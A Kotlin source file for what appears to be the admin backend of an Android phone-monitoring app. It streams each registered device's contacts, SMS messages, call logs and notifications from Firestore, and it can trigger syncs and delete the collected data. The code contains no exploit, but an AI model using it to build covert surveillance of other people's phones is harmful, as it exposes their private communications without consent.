package com.datasync.admin.data.repository

import com.datasync.admin.domain.repository.AdminRepository
import android.util.Log
import com.datasync.admin.model.*
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.Query
import com.google.firebase.firestore.SetOptions
import com.google.firebase.firestore.snapshots
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.flow.distinctUntilChanged
import kotlinx.coroutines.flow.map
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class AdminRepositoryImpl @Inject constructor(
    private val db: FirebaseFirestore
) : AdminRepository {

    override fun getDevices(): Flow<List<Device>> {
        return db.collection("devices")
            .orderBy("lastSyncTime", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot ->
                snapshot.documents.mapNotNull { it.toObject(Device::class.java) }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "Error fetching devices", e)
                emit(emptyList())
            }
            .distinctUntilChanged()
    }

    override fun getContacts(deviceId: String): Flow<List<Contact>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("contacts")
            .orderBy("name", Query.Direction.ASCENDING)
            .snapshots()
            .map { snapshot ->
                snapshot.documents.mapNotNull { it.toObject(Contact::class.java) }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "Error fetching contacts for $deviceId", e)
                emit(emptyList())
            }
            .distinctUntilChanged()
    }

    override fun getSMS(deviceId: String): Flow<List<SMS>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("sms")
            .orderBy("date", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot ->
                snapshot.documents.mapNotNull { it.toObject(SMS::class.java) }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "Error fetching SMS for $deviceId", e)
                emit(emptyList())
            }
            .distinctUntilChanged()
    }

    override fun getCallLogs(deviceId: String): Flow<List<CallLog>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("calllogs")
            .orderBy("date", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot ->
                snapshot.documents.mapNotNull { it.toObject(CallLog::class.java) }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "Error fetching call logs for $deviceId", e)
                emit(emptyList())
            }
            .distinctUntilChanged()
    }

    override fun getNotifications(deviceId: String): Flow<List<NotificationData>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("notifications")
            .orderBy("timestamp", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot ->
                snapshot.documents.mapNotNull { it.toObject(NotificationData::class.java) }
            }
            .catch { e ->
                Log.e("AdminRepositoryImpl", "Error fetching notifications for $deviceId", e)
                emit(emptyList())
            }
            .distinctUntilChanged()
    }

    override suspend fun requestSync(deviceId: String) {
        try {
            db.collection("devices")
                .document(deviceId)
                .set(mapOf("syncRequestedAt" to System.currentTimeMillis()), SetOptions.merge())
                .await()
        } catch (e: Exception) {
            Log.e("AdminRepositoryImpl", "Error requesting sync", e)
        }
    }

    override suspend fun deleteItem(deviceId: String, collection: String, itemId: String) {
        try {
            db.collection("devices")
                .document(deviceId)
                .collection(collection)
                .document(itemId)
                .delete()
                .await()
        } catch (e: Exception) {
            Log.e("AdminRepositoryImpl", "Error deleting item $itemId from $collection", e)
        }
    }

    override suspend fun deleteAllItems(deviceId: String, collection: String) {
        try {
            while (true) {
                val snapshot = db.collection("devices")
                    .document(deviceId)
                    .collection(collection)
                    .limit(500)
                    .get()
                    .await()

                if (snapshot.isEmpty) break

                val batch = db.batch()
                for (doc in snapshot.documents) {
                    batch.delete(doc.reference)
                }
                batch.commit().await()
            }
        } catch (e: Exception) {
            Log.e("AdminRepositoryImpl", "Error deleting all items from $collection", e)
        }
    }

    override suspend fun deleteDevice(deviceId: String) {
        try {
            // Delete sub-collections first
            val collections = listOf("contacts", "sms", "calllogs", "notifications")
            for (collection in collections) {
                deleteAllItems(deviceId, collection)
            }
            // Delete device document
            db.collection("devices").document(deviceId).delete().await()
        } catch (e: Exception) {
            Log.e("AdminRepositoryImpl", "Error deleting device $deviceId", e)
        }
    }
}
